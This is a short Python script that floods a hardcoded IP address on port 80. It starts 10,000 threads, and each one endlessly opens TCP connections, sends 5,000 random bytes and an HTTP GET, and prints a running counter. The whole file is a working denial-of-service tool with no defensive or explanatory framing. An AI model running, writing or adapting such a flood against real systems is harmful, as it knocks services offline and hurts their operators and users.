import socket
import threading
import random
target = '104.22.5.207'

port = 80
num = 0

def run():
    while True:
        bytes = random._urandom(5000)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.connect((target, port))
        s.sendto(bytes, (target,port))
        request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"

        s.sendall(request.encode('ascii'))

        global num
        num += 1
        print(num)



for i in range(10000):
    thread = threading.Thread(target=run)
    thread.start()
